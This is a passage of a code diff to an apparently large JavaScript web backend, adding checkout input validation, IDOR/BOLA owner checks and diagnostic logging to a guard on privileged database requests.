+  if (!body || typeof body !== 'object' || Array.isArray(body)) {
+    return { ok: false, reason: 'zeroday_checkout_body_invalid' };
+  }
+
+  if (!Object.prototype.hasOwnProperty.call(body, 'items')) {
+    return { ok: true, width: Array.isArray(flat) ? flat.length : 0 };
+  }
+
+  const topLevelKeys = Object.keys(body);
+  if (topLevelKeys.length > 80) return { ok: false, reason: 'zeroday_field_too_many' };
+
+  const items = body.items;
+  if (!Array.isArray(items)) return { ok: false, reason: 'zeroday_checkout_items_invalid' };
+  if (items.length > 50) return { ok: false, reason: 'zeroday_checkout_items_too_many' };
+
+  const contract = diracCentralContractForActionV146(ctx.action);
+  const allowed = new Set(['action'].concat(contract.allowed || []));
+  const maxFieldBytes = contract.maxFieldBytes || 3000;
+
+  for (const item of items) {
+    if (!item || typeof item !== 'object' || Array.isArray(item)
+      || Object.getPrototypeOf(item) !== Object.prototype) {
+      return { ok: false, reason: 'zeroday_checkout_item_invalid' };
+    }
+    const keys = Object.keys(item);
+    if (keys.length > 24) return { ok: false, reason: 'zeroday_checkout_item_field_too_many' };
+    for (const key of keys) {
+      if (key === '__proto__' || key === 'prototype' || key === 'constructor') {
+        return { ok: false, reason: 'zeroday_checkout_item_key_invalid' };
+      }
+      if (!allowed.has(key) && !contract.allowExtra) {
+        return { ok: false, reason: 'field_not_allowed_' + key };
+      }
+      if (diracCentralProtectedFieldV146(key) && !contract.allowProtectedFields) {
+        return { ok: false, reason: 'protected_field_from_frontend_' + key };
+      }
+      const value = item[key];
+      if (value !== null && typeof value === 'object') {
+        return { ok: false, reason: 'zeroday_checkout_item_nested_invalid' };
+      }
+      if (String(value === undefined || value === null ? '' : value).length > maxFieldBytes) {
+        return { ok: false, reason: 'field_too_long_' + key };
+      }
+      const format = diracCentralValidateFieldFormatV146(key, value);
+      if (!format.ok) return format;
+    }
+  }
+
+  const outsideItems = (Array.isArray(flat) ? flat : []).filter((item) => {
+    return !/^items\.\d+(?:\.|$)/.test(String(item && item.key || ''));
+  }).length;
+  return { ok: true, width: outsideItems + items.length };
+}
+
 function diracCentralZeroDayShieldV146(req, ctx, normalized) {
   const flat = diracCentralFlattenObjectV146(ctx.body || {}, 0, '', 1000);
-  if (flat.length > 80) return { ok: false, reason: 'zeroday_field_too_many' };
+  const checkoutWidth = diracCentralCheckoutOrderFieldWidthV191(ctx, flat);
+  if (!checkoutWidth.ok) return checkoutWidth;
+  if (checkoutWidth.width > 80) return { ok: false, reason: 'zeroday_field_too_many' };
   if (flat.some((item) => item.depth > 5)) return { ok: false, reason: 'zeroday_nested_too_deep' };
   if (String(ctx.sample || '').length > 10 * 1024) return { ok: false, reason: 'zeroday_payload_too_long' };
   const headers = req && req.headers || {};
@@ -26936,14 +35365,16 @@ async function diracCentralRecoveryWorkerIdorGuardV146(req, ctx) {
 }
 
 async function diracCentralIdorBolaGuardV146(req, ctx) {
+  if (ctx && ctx.classification === 'server' && ctx.action === 'security_report') return { ok: true, guarded: 'server_to_server_signed_security_evidence' };
   if (ctx && ctx.classification === 'server' && ctx.action === 'midtrans_webhook') return { ok: true, guarded: 'server_to_server_signed_webhook' };
   if (ctx && ctx.classification === 'server' && ctx.action === DIRAC_RECOVERY_WORKER_ACTION) {
     return await diracCentralRecoveryWorkerIdorGuardV146(req, ctx);
   }
   const ids = diracCentralCollectIdsV146(req, ctx.body);
+  const verifiedOwnerRequired = diracCentralVerifiedOwnerActionV217(ctx.action);
   if (diracCentralIsAuthBootstrapIdentityOnlyV146(ctx.action, ids)) return { ok: true, guarded: 'auth_bootstrap_identity_only' };
-  if (diracCentralIsAuthSelfReadOnlyV146(ctx.action, ids)) return { ok: true, guarded: 'auth_self_read_only' };
-  const needsOwner = ids.length > 0 || DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(ctx.action);
+  if (diracCentralIsAuthSelfReadOnlyV146(ctx.action, ids) && !verifiedOwnerRequired) return { ok: true, guarded: 'auth_self_read_only' };
+  const needsOwner = verifiedOwnerRequired || ids.length > 0 || DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(ctx.action);
   if (!needsOwner) return { ok: true, guarded: 'no_sensitive_id_and_not_user_data' };
   if (ids.length > 12) return { ok: false, reason: 'idor_too_many_ids' };
 
@@ -26953,6 +35384,14 @@ async function diracCentralIdorBolaGuardV146(req, ctx) {
     if (boot && boot.ok) owner = await diracCentralResolveOwnerV146(req);
   }
   if (!owner || !owner.ok || !owner.customerIds || !owner.customerIds.length) return { ok: false, reason: 'idor_owner_unavailable' };
+  if (ctx && diracCentralVerifiedOwnerActionV217(ctx.action) && owner.customerIds.length === 1) {
+    ctx.__diracCentralVerifiedOwnerCustomerIdV217 = String(owner.customerIds[0] || '').trim();
+    ctx.__diracCentralVerifiedOwnerAuthUserIdV217 = String(owner.authUserId || '').trim();
+    if (ctx.action === 'checkout_order' || ctx.action === 'create_payment') {
+      ctx.__diracCentralCheckoutOwnerCustomerIdV196 = ctx.__diracCentralVerifiedOwnerCustomerIdV217;
+      ctx.__diracCentralCheckoutOwnerAuthUserIdV196 = ctx.__diracCentralVerifiedOwnerAuthUserIdV217;
+    }
+  }
   const allowedCustomers = new Set(owner.customerIds.map(String));
   const requestedCustomer = ids.filter((item) => item.key === 'customer_id').map((item) => item.value).filter(diracCentralLooksLikeUuidV146);
   if (requestedCustomer.some((id) => !allowedCustomers.has(id))) return { ok: false, reason: 'idor_customer_id_mismatch' };
@@ -26964,6 +35403,11 @@ async function diracCentralIdorBolaGuardV146(req, ctx) {
   const rows = await diracCentralLookupOwnerRowsV146(objects);
   const foreign = rows.find((row) => row.customer_id && !allowedCustomers.has(String(row.customer_id)));
   if (foreign) return { ok: false, reason: 'idor_object_owner_mismatch' };
+  const ownerBoundObjects = objects.filter((item) => /^(order_id|order_code|domain_order_id|payment_id|transaction_id|invoice_id|gateway_reference|session_id|recovery_code_id)$/i.test(item.key));
+  if (ownerBoundObjects.some((item) => !rows.some((row) => diracCentralOwnerRowMatchesObjectV194(row, item)))) {
+    return { ok: false, reason: 'idor_object_owner_unresolved' };
+  }
+  ctx.__diracCentralOwnerBoundObjectValuesV194 = new Set(ownerBoundObjects.map((item) => String(item.value || '').trim()).filter(Boolean));
   return { ok: true };
 }
 
@@ -26983,31 +35427,259 @@ function diracCentralIsAuthSelfReadOnlyV146(action, ids) {
   return list.every((item) => /^(email|slug)$/i.test(String(item && item.key || '')));
 }
 
+function diracCentralCheckoutStage26BootstrapModeV216(ctx, req) {
+  if (!ctx || !req || ctx.req !== req) return false;
+  if (!diracCentralVerifiedOwnerActionV217(ctx.action)) return false;
+  const contract = diracCentralContractForActionV146(ctx.action);
+  if (!contract || !Array.isArray(contract.methods) || !contract.methods.includes(ctx.method)) return false;
+  if (ctx.executionPhaseV211 !== 'guard' || ctx.currentStageV211 !== 'IDOR/BOLA' || Number(ctx.currentStageIndexV211) !== 26) return false;
+  if (ctx.centralGuardFullyPassedV211 === true || req.__diracCentralSecurityGuardPassedV146 === true) return false;
+  if (String(ctx.failedStageV211 || '') || String(ctx.failureReasonV211 || '')) return false;
+  try { if (BigInt(ctx.passport || 0n) !== 0x3ffffffn) return false; } catch (_) { return false; }
+  const trace = Array.isArray(ctx.stageTraceV211) ? ctx.stageTraceV211 : [];
+  return trace.length === 26 && trace.every((item, index) => item && Number(item.index) === index && String(item.result || '') === 'passed');
+}
+
+function diracCentralOwnerBootstrapModeV213(ctx, req) {
+  if (diracCentralCheckoutStage26BootstrapModeV216(ctx, req)) return true;
+  if (!ctx || !req || ctx.req !== req) return false;
+  if (ctx.__diracCentralOwnerScopeResolvingV146 !== true) return false;
+  if (ctx.action !== 'domain_me' && !diracCentralVerifiedOwnerActionV217(ctx.action)) return false;
+  const contract = diracCentralContractForActionV146(ctx.action);
+  if (!contract || !Array.isArray(contract.methods) || !contract.methods.includes(ctx.method)) return false;
+  if (typeof diracCentralHandlerContextFullyPassedV211 !== 'function') return false;
+  return diracCentralHandlerContextFullyPassedV211(ctx, req);
+}
+
+async function diracCentralPrepareOwnerBootstrapBindingV213(req, ctx, debug) {
+  const existing = ctx && ctx.__diracCentralOwnerBootstrapBindingV213;
+  if (existing
+      && String(existing.requestId || '') === String(ctx.requestId || '')
+      && String(existing.action || '') === String(ctx.action || '')
+      && diracCentralLooksLikeUuidV146(String(existing.authUserId || ''))) {
+    if (debug && typeof debug === 'object') debug.bootstrap_v213 = { result: 'binding_reused', auth_user_binding_present: true };
+    return { ok: true };
+  }
+  if (typeof requireDomainUser !== 'function') {
+    if (debug && typeof debug === 'object') debug.bootstrap_v213 = { result: 'dependency_missing', dependency: 'requireDomainUser' };
+    return { ok: false, reason: 'owner_bootstrap_auth_dependency_missing' };
+  }
+
+  const fake = diracCentralFakeResponseV146();
+  let user = null;
+  try {
+    user = await requireDomainUser(req, fake);
+  } catch (error) {
+    if (debug && typeof debug === 'object') {
+      debug.bootstrap_v213 = { result: 'require_domain_user_exception', response_status: Number(fake.statusCode || 0), error: diracCentralSafeDiagnosticErrorV212(error) };
+    }
+    return { ok: false, reason: 'owner_bootstrap_auth_exception' };
+  }
+
+  const authUserId = String(user && user.id || '').trim();
+  if (!diracCentralLooksLikeUuidV146(authUserId) || Number(fake.statusCode || 200) >= 400) {
+    if (debug && typeof debug === 'object') {
+      debug.bootstrap_v213 = {
+        result: 'authenticated_user_invalid',
+        response_status: Number(fake.statusCode || 0),
+        user_object_present: Boolean(user && typeof user === 'object'),
+        auth_user_id_present: Boolean(authUserId),
+        auth_user_id_uuid_valid: diracCentralLooksLikeUuidV146(authUserId)
+      };
+    }
+    return { ok: false, reason: 'owner_bootstrap_authenticated_user_invalid' };
+  }
+
+  ctx.__diracCentralOwnerBootstrapBindingV213 = Object.freeze({
+    patch: DIRAC_CENTRAL_OWNER_BOOTSTRAP_PATCH_V213,
+    requestId: String(ctx.requestId || ''),
+    action: String(ctx.action || ''),
+    authUserId
+  });
+  ctx.ownerBootstrapDebugV213 = {
+    patch: DIRAC_CENTRAL_OWNER_BOOTSTRAP_PATCH_V213,
+    result: 'binding_ready',
+    diagnostic_code: 'OWNER_BOOTSTRAP_AUTH_USER_BOUND',
+    failure_point: 'diracCentralPrepareOwnerBootstrapBindingV213',
+    action: String(ctx.action || '').slice(0, 80),
+    full_central_guard_passed: typeof diracCentralHandlerContextFullyPassedV211 === 'function' && diracCentralHandlerContextFullyPassedV211(ctx, req),
+    checkout_stage26_pre_idor: diracCentralCheckoutStage26BootstrapModeV216(ctx, req),
+    owner_scope_resolving: ctx.__diracCentralOwnerScopeResolvingV146 === true,
+    auth_user_binding_present: true
+  };
+  if (debug && typeof debug === 'object') {
+    debug.bootstrap_v213 = {
+      result: 'binding_ready',
+      response_status: Number(fake.statusCode || 0),
+      auth_user_id_present: true,
+      auth_user_id_uuid_valid: true
+    };
+  }
+  return { ok: true };
+}
+
 async function diracCentralResolveOwnerV146(req) {
+  const ctx = diracCentralCurrentContextV149();
+  const debug = {
+    patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+    resolver: 'diracCentralResolveOwnerV146',
+    started_at_ms: Date.now(),
+    attempts: []
+  };
+
+  if (diracCentralOwnerBootstrapModeV213(ctx, req)) {
+    const prepared = await diracCentralPrepareOwnerBootstrapBindingV213(req, ctx, debug);
+    if (!prepared || prepared.ok !== true) {
+      diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_BOOTSTRAP_BINDING_FAILED', 'diracCentralPrepareOwnerBootstrapBindingV213');
+      return { ok: false, reason: String(prepared && prepared.reason || 'owner_bootstrap_binding_failed') };
+    }
+  }
+
   try {
     if (typeof diracBolaIdorV133ResolveStrictOwner === 'function') {
-      const owner = await diracBolaIdorV133ResolveStrictOwner(req);
-      if (owner && owner.ok && owner.customerIds && owner.customerIds.length) return owner;
+      try {
+        const owner = await diracBolaIdorV133ResolveStrictOwner(req);
+        const count = Array.isArray(owner && owner.customerIds) ? owner.customerIds.length : 0;
+        debug.attempts.push({ resolver: 'diracBolaIdorV133ResolveStrictOwner', result: owner && owner.ok && count ? 'owner_found' : 'no_owner', customer_count: count });
+        if (owner && owner.ok && owner.customerIds && owner.customerIds.length) {
+          diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_RESOLVED_BY_V133', 'diracBolaIdorV133ResolveStrictOwner');
+          return owner;
+        }
+      } catch (error) {
+        debug.attempts.push({ resolver: 'diracBolaIdorV133ResolveStrictOwner', result: 'exception', error: diracCentralSafeDiagnosticErrorV212(error) });
+      }
+    } else {
+      debug.attempts.push({ resolver: 'diracBolaIdorV133ResolveStrictOwner', result: 'function_missing' });
     }
-  } catch (_) {}
+  } catch (error) {
+    debug.attempts.push({ resolver: 'diracBolaIdorV133ResolveStrictOwner.outer', result: 'exception', error: diracCentralSafeDiagnosticErrorV212(error) });
+  }
+
   try {
     if (typeof diracBolaIdorV128ResolveRequestOwner === 'function') {
-      const owner = await diracBolaIdorV128ResolveRequestOwner(req);
-      if (owner && owner.ok && owner.customerIds && owner.customerIds.length) return owner;
+      try {
+        const owner = await diracBolaIdorV128ResolveRequestOwner(req);
+        const count = Array.isArray(owner && owner.customerIds) ? owner.customerIds.length : 0;
+        debug.attempts.push({ resolver: 'diracBolaIdorV128ResolveRequestOwner', result: owner && owner.ok && count ? 'owner_found' : 'no_owner', customer_count: count });
+        if (owner && owner.ok && owner.customerIds && owner.customerIds.length) {
+          diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_RESOLVED_BY_V128', 'diracBolaIdorV128ResolveRequestOwner');
+          return owner;
+        }
+      } catch (error) {
+        debug.attempts.push({ resolver: 'diracBolaIdorV128ResolveRequestOwner', result: 'exception', error: diracCentralSafeDiagnosticErrorV212(error) });
+      }
+    } else {
+      debug.attempts.push({ resolver: 'diracBolaIdorV128ResolveRequestOwner', result: 'function_missing' });
     }
-  } catch (_) {}
-  if (typeof requireDomainUser !== 'function' || typeof customerSecurityFetchAuthLink !== 'function') return { ok: false };
+  } catch (error) {
+    debug.attempts.push({ resolver: 'diracBolaIdorV128ResolveRequestOwner.outer', result: 'exception', error: diracCentralSafeDiagnosticErrorV212(error) });
+  }
+
+  const requireUserAvailable = typeof requireDomainUser === 'function';
+  const authLinkFetchAvailable = typeof customerSecurityFetchAuthLink === 'function';
+  debug.fallback_dependencies = {
+    require_domain_user: requireUserAvailable,
+    customer_security_fetch_auth_link: authLinkFetchAvailable
+  };
+  if (!requireUserAvailable || !authLinkFetchAvailable) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_FALLBACK_DEPENDENCY_MISSING', 'diracCentralResolveOwnerV146.dependencies');
+    return { ok: false };
+  }
+
   const fake = diracCentralFakeResponseV146();
-  const user = await requireDomainUser(req, fake).catch(() => null);
+  let user = null;
+  try {
+    user = await requireDomainUser(req, fake);
+    debug.require_domain_user = {
+      result: user && typeof user === 'object' ? 'returned_user' : 'no_user',
+      response_status: Number(fake.statusCode || 0),
+      user_object_present: Boolean(user && typeof user === 'object'),
+      user_id_present: Boolean(user && user.id),
+      user_email_present: Boolean(user && user.email)
+    };
+  } catch (error) {
+    debug.require_domain_user = {
+      result: 'exception',
+      response_status: Number(fake.statusCode || 0),
+      error: diracCentralSafeDiagnosticErrorV212(error)
+    };
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_REQUIRE_DOMAIN_USER_EXCEPTION', 'requireDomainUser');
+    return { ok: false };
+  }
+
   const authUserId = String(user && user.id || '').trim();
-  if (!diracCentralLooksLikeUuidV146(authUserId)) return { ok: false };
-  const link = await customerSecurityFetchAuthLink(authUserId).catch(() => null);
-  const rows = link && link.ok && Array.isArray(link.data) ? link.data.filter((row) => row && String(row.link_status || '').toLowerCase() === 'active' && !row.disabled_at && !row.revoked_at) : [];
+  const authUserIdValid = diracCentralLooksLikeUuidV146(authUserId);
+  debug.auth_user = {
+    id_present: Boolean(authUserId),
+    id_uuid_valid: authUserIdValid,
+    email_present: Boolean(user && user.email),
+    require_domain_user_status: Number(fake.statusCode || 0)
+  };
+  if (!authUserIdValid) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_USER_ID_INVALID_OR_MISSING', 'diracCentralResolveOwnerV146.auth_user_id');
+    return { ok: false };
+  }
+
+  let link = null;
+  try {
+    link = await customerSecurityFetchAuthLink(authUserId);
+  } catch (error) {
+    debug.auth_link_fetch = {
+      result: 'exception',
+      error: diracCentralSafeDiagnosticErrorV212(error)
+    };
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_FETCH_EXCEPTION', 'customerSecurityFetchAuthLink');
+    return { ok: false, reason: 'owner_unavailable' };
+  }
+
+  const dataIsArray = Boolean(link && Array.isArray(link.data));
+  const rawRows = dataIsArray ? link.data.filter((row) => row && typeof row === 'object') : [];
+  const rows = link && link.ok && dataIsArray
+    ? rawRows.filter((row) => String(row.link_status || '').toLowerCase() === 'active' && !row.disabled_at && !row.revoked_at)
+    : [];
   const customerIds = Array.from(new Set(rows
     .map((row) => String(row.customer_id || '').trim())
     .filter(diracCentralLooksLikeUuidV146)));
-  if (rows.length === 0 || customerIds.length === 0) return { ok: false, reason: 'owner_unavailable' };
-  if (rows.length > 1 || customerIds.length > 1) return { ok: false, reason: 'owner_ambiguous' };
+  const statusCounts = rawRows.reduce((out, row) => {
+    const status = String(row.link_status || 'missing').toLowerCase().replace(/[^a-z0-9_-]/g, '').slice(0, 40) || 'missing';
+    out[status] = Number(out[status] || 0) + 1;
+    return out;
+  }, {});
+  debug.auth_link_fetch = {
+    result: link && link.ok && dataIsArray ? 'valid_result' : 'invalid_result',
+    link_ok: Boolean(link && link.ok),
+    data_is_array: dataIsArray,
+    raw_row_count: rawRows.length,
+    active_row_count: rows.length,
+    disabled_row_count: rawRows.filter((row) => Boolean(row.disabled_at)).length,
+    revoked_row_count: rawRows.filter((row) => Boolean(row.revoked_at)).length,
+    missing_customer_id_count: rows.filter((row) => !String(row.customer_id || '').trim()).length,
+    invalid_customer_id_count: rows.filter((row) => String(row.customer_id || '').trim() && !diracCentralLooksLikeUuidV146(String(row.customer_id || '').trim())).length,
+    distinct_valid_customer_count: customerIds.length,
+    status_counts: statusCounts
+  };
+
+  if (!link || link.ok !== true || !dataIsArray) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_RESULT_INVALID', 'customerSecurityFetchAuthLink.result');
+    return { ok: false, reason: 'owner_unavailable' };
+  }
+  if (rows.length === 0) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_NO_ACTIVE_ROW', 'security_customer_auth_links.active_filter');
+    return { ok: false, reason: 'owner_unavailable' };
+  }
+  if (customerIds.length === 0) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_CUSTOMER_ID_MISSING_OR_INVALID', 'security_customer_auth_links.customer_id');
+    return { ok: false, reason: 'owner_unavailable' };
+  }
+  if (rows.length > 1) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_MULTIPLE_ACTIVE_ROWS', 'security_customer_auth_links.active_rows');
+    return { ok: false, reason: 'owner_ambiguous' };
+  }
+  if (customerIds.length > 1) {
+    diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_AUTH_LINK_MULTIPLE_CUSTOMERS', 'security_customer_auth_links.customer_id_set');
+    return { ok: false, reason: 'owner_ambiguous' };
+  }
+  diracCentralCommitOwnerDebugV212(ctx, debug, 'OWNER_RESOLVED_BY_AUTH_LINK', 'security_customer_auth_links');
   return { ok: true, authUserId, customerIds };
 }
 
@@ -27040,20 +35712,72 @@ async function diracCentralLookupOwnerRowsV146(objects) {
   if (cached && Number(cached.until || 0) > Date.now()) return cached.rows || [];
   const rows = [];
   const values = (regex) => Array.from(new Set((objects || []).filter((item) => regex.test(item.key)).map((item) => String(item.value || '').trim()).filter(Boolean))).slice(0, 40);
-  try {
-    if (typeof diracV143FetchOwnerRows === 'function') {
-      rows.push(...await diracV143FetchOwnerRows('orders', values(/^(order_id|order_code|item_id)$/i), ['id', 'order_id']).catch(() => []));
-      rows.push(...await diracV143FetchOwnerRows('domain_orders', values(/^(domain_order_id|order_id|order_code)$/i), ['id', 'order_code']).catch(() => []));
-      rows.push(...await diracV143FetchOwnerRows('payment_transactions', values(/^(payment_id|transaction_id|gateway_reference|invoice_id)$/i), ['id', 'gateway_reference']).catch(() => []));
-    }
-    if (typeof diracBolaIdorV128FetchOwnerRows === 'function') {
-      rows.push(...await diracBolaIdorV128FetchOwnerRows('security_customer_sessions', values(/^session_id$/i), 'id').catch(() => []));
-      rows.push(...await diracBolaIdorV128FetchOwnerRows('security_customer_recovery_codes', values(/^recovery_code_id$/i), 'id').catch(() => []));
-    }
-  } catch (_) {}
+  rows.push(...await diracCentralFetchOwnerRowsV194('orders', values(/^(order_id|order_code)$/i), ['id', 'order_id']));
+  rows.push(...await diracCentralFetchOwnerRowsV194('domain_orders', values(/^(domain_order_id|order_id)$/i), ['id']));
+  rows.push(...await diracCentralFetchOwnerRowsV194('payment_transactions', values(/^(payment_id|transaction_id|gateway_reference|invoice_id)$/i), ['id', 'gateway_reference']));
+  rows.push(...await diracCentralFetchOwnerRowsV194('security_customer_sessions', values(/^session_id$/i), ['id']));
+  rows.push(...await diracCentralFetchOwnerRowsV194('security_customer_recovery_codes', values(/^recovery_code_id$/i), ['id']));
   const cleanRows = rows.slice(0, 120);
   DIRAC_CENTRAL_OWNER_LOOKUP_CACHE_V146.set(cacheKey, { until: Date.now() + 5000, rows: cleanRows });
   return cleanRows;
+}
+
+async function diracCentralFetchOwnerRowsV194(table, requestedValues, columns) {
+  const cleanTable = String(table || '').trim();
+  const values = Array.from(new Set((requestedValues || []).map((value) => String(value || '').trim()).filter(Boolean))).slice(0, 40);
+  const safeColumns = (columns || []).map((column) => String(column || '').trim()).filter((column) => /^[a-zA-Z0-9_]+$/.test(column)).slice(0, 4);
+  if (!values.length) return [];
+  if (!/^(orders|domain_orders|payment_transactions|security_customer_sessions|security_customer_recovery_codes)$/.test(cleanTable) || !safeColumns.length) {
+    throw new Error('CENTRAL_OWNER_LOOKUP_CONTRACT_INVALID');
+  }
+  const selectByTable = {
+    orders: 'id,customer_id,order_id',
+    domain_orders: 'id,customer_id',
+    payment_transactions: 'id,customer_id,order_id,domain_order_id,gateway_reference',
+    security_customer_sessions: 'id,customer_id',
+    security_customer_recovery_codes: 'id,customer_id'
+  };
+  const clauses = [];
+  for (const column of safeColumns) {
+    for (const value of values) {
+      if (column === 'id' && !diracCentralLooksLikeUuidV146(value)) continue;
+      if (!/^[A-Za-z0-9._:@-]{1,160}$/.test(value)) continue;
+      clauses.push(column + '.eq.' + value);
+    }
+  }
+  if (!clauses.length) return [];
+  const path = '/rest/v1/' + encodeURIComponent(cleanTable)
+    + '?select=' + encodeURIComponent(selectByTable[cleanTable])
+    + '&or=' + encodeURIComponent('(' + clauses.slice(0, 80).join(',') + ')')
+    + '&limit=80';
+  const ctx = diracCentralCurrentContextV149();
+  if (!ctx) throw new Error('CENTRAL_OWNER_LOOKUP_CONTEXT_REQUIRED');
+  const previousOwnerLookup = ctx.__diracCentralOwnerLookupV194 === true;
+  ctx.__diracCentralOwnerLookupV194 = true;
+  let result;
+  try {
+    result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+  } finally {
+    ctx.__diracCentralOwnerLookupV194 = previousOwnerLookup;
+  }
+  if (!result || result.ok !== true || !Array.isArray(result.data)) {
+    throw new Error('CENTRAL_OWNER_LOOKUP_STORAGE_FAILED');
+  }
+  return result.data.filter((row) => row && diracCentralLooksLikeUuidV146(row.customer_id)).map((row) => ({ ...row, table: cleanTable }));
+}
+
+function diracCentralOwnerRowMatchesObjectV194(row, item) {
+  const key = String(item && item.key || '').toLowerCase();
+  const value = String(item && item.value || '').trim();
+  if (!row || !value) return false;
+  const candidates = key === 'order_code'
+    ? [row.order_code, row.order_id, row.id]
+    : key === 'domain_order_id'
+      ? [row.domain_order_id, row.order_id, row.id]
+      : /^(payment_id|transaction_id|invoice_id|gateway_reference)$/.test(key)
+        ? [row.gateway_reference, row.id]
+        : [row.id, row.order_id];
+  return candidates.some((candidate) => String(candidate || '').trim() === value);
 }
 
 function diracCentralIsDashboardSelfReadAuthLinkWriteV146(ctx, table, options, method, protectedFields) {
@@ -27080,24 +35804,63 @@ function diracCentralIsDashboardSelfReadAuthLinkWriteV146(ctx, table, options, m
 async function diracCentralInspectServiceRoleAccessV146(path, options = {}) {
   if (!options || options.auth !== 'service') return { ok: true };
   const ctx = diracCentralCurrentContextV149();
-  if (!ctx || !ctx.__serviceGuardActive && ctx.action === 'midtrans_webhook') return { ok: true };
-  const table = diracCentralExtractRestTableV146(path);
+  if (!ctx) return { block: true, reason: 'service_role_central_context_required', status: 503 };
+  const requestedMethodV212 = String(options.method || 'GET').toUpperCase();
+  const requestedTableV212 = diracCentralExtractRestTableV146(path);
+  if (!ctx.__serviceGuardActive && ctx.action === 'midtrans_webhook') return { ok: true };
+  const table = requestedTableV212;
   if (!diracCentralOwnedTableV146(table)) return { ok: true };
-  const method = String(options.method || 'GET').toUpperCase();
+  const method = requestedMethodV212;
+  const requestShapeV212 = diracCentralSafeRestShapeV212(path, options, table, method);
+  if (diracCentralIsInternalOwnerLookupV194(ctx, table, path, options, method)) {
+    return { ok: true, guarded: 'central_owner_lookup_v194' };
+  }
   if (diracCentralIsRegisterBootstrapServiceRoleV146(ctx, table, path, options, method)) return { ok: true, guarded: 'domain_register_bootstrap_service_role' };
   if (diracCentralIsCheckoutOwnerBootstrapServiceRoleV146(ctx, table, path, options, method)) return { ok: true, guarded: 'checkout_owner_bootstrap_service_role' };
+  const checkoutStage26OwnerReadV216 = diracBolaIdorV128CentralOwnerBootstrapDecisionV213(path, options, { req: ctx.req, action: ctx.action }, 'central_gateway');
+  if (checkoutStage26OwnerReadV216 && checkoutStage26OwnerReadV216.relevant === true) {
+    if (checkoutStage26OwnerReadV216.ok === true) return { ok: true, guarded: 'checkout_stage26_exact_self_owner_read_v216' };
+    const stage26ReasonV216 = String(checkoutStage26OwnerReadV216.code || 'checkout_stage26_owner_read_rejected');
+    diracCentralEmitServiceRoleBlockV212(ctx, stage26ReasonV216, { diagnostic_code: stage26ReasonV216, failure_point: 'checkout_stage26_owner_read_v216', request_shape: requestShapeV212 });
+    await diracCentralBanCurrentContextV146(stage26ReasonV216).catch(() => null);
+    return { block: true, reason: stage26ReasonV216, status: 403 };
+  }
+  if (diracCentralIsCheckoutCustomerOwnerReadServiceRoleV196(ctx, table, path, options, method)) return { ok: true, guarded: 'checkout_customer_owner_read_service_role_v196' };
   if (diracCentralIsCheckoutOrderCreateServiceRoleV146(ctx, table, path, options, method)) return { ok: true, guarded: 'checkout_order_create_service_role' };
+  if (diracCentralIsCreatePaymentTransactionServiceRoleV199(ctx, table, path, options, method)) return { ok: true, guarded: 'create_payment_transaction_service_role_v199' };
   if (diracCentralIsPasskeyServiceRoleV146(ctx, table, path, options, method)) return { ok: true, guarded: 'passkey_owner_scoped_service_role' };
   const hasOwnerScope = diracCentralPathHasOwnerScopeV146(path, options.body);
   const hasObjectScope = diracCentralPathHasObjectScopeV146(path, options.body);
   if (!hasOwnerScope && !hasObjectScope) {
+    diracCentralEmitServiceRoleBlockV212(ctx, 'service_role_without_owner_scope', {
+      diagnostic_code: 'SERVICE_ROLE_REQUEST_HAS_NO_OWNER_OR_OBJECT_SCOPE',
+      failure_point: 'diracCentralInspectServiceRoleAccessV146.scope_presence',
+      request_shape: requestShapeV212,
+      has_owner_scope: false,
+      has_object_scope: false
+    });
     await diracCentralBanCurrentContextV146('service_role_without_owner_scope').catch(() => null);
     return { block: true, reason: 'service_role_without_owner_scope', status: 403 };
   }
-  const ownerScope = await diracCentralServiceRoleOwnerScopeGuardV146(ctx, path, options.body).catch(() => ({ ok: false, reason: 'service_role_owner_scope_error' }));
+  const ownerScope = await diracCentralServiceRoleOwnerScopeGuardV146(ctx, path, options.body).catch((error) => {
+    ctx.serviceRoleDebugV212 = {
+      patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+      diagnostic_code: 'SERVICE_ROLE_OWNER_SCOPE_GUARD_EXCEPTION',
+      failure_point: 'diracCentralServiceRoleOwnerScopeGuardV146',
+      request_shape: requestShapeV212,
+      error: diracCentralSafeDiagnosticErrorV212(error)
+    };
+    return { ok: false, reason: 'service_role_owner_scope_error' };
+  });
   if (!ownerScope.ok) {
-    await diracCentralBanCurrentContextV146(ownerScope.reason || 'service_role_owner_scope_mismatch').catch(() => null);
-    return { block: true, reason: ownerScope.reason || 'service_role_owner_scope_mismatch', status: 403 };
+    const reason = ownerScope.reason || 'service_role_owner_scope_mismatch';
+    diracCentralEmitServiceRoleBlockV212(ctx, reason, {
+      request_shape: requestShapeV212,
+      has_owner_scope: hasOwnerScope,
+      has_object_scope: hasObjectScope
+    });
+    await diracCentralBanCurrentContextV146(reason).catch(() => null);
+    return { block: true, reason, status: 403 };
   }
   if (['POST', 'PUT', 'PATCH'].includes(method)) {
     const fields = diracCentralFlattenObjectV146(options.body || {}, 0, '', 200).map((item) => item.key.split('.').pop());
@@ -27123,6 +35886,13 @@ async function diracCentralInspectServiceRoleAccessV146(path, options = {}) {
         });
       const allowDashboardSelfReadAuthLink = diracCentralIsDashboardSelfReadAuthLinkWriteV146(ctx, table, options, method, protectedFields);
       if (!allowCreatePaymentUnpaid && !allowDashboardSelfReadAuthLink) {
+        diracCentralEmitServiceRoleBlockV212(ctx, 'service_role_protected_field', {
+          diagnostic_code: 'SERVICE_ROLE_PROTECTED_FIELD_WRITE_REJECTED',
+          failure_point: 'diracCentralInspectServiceRoleAccessV146.protected_fields',
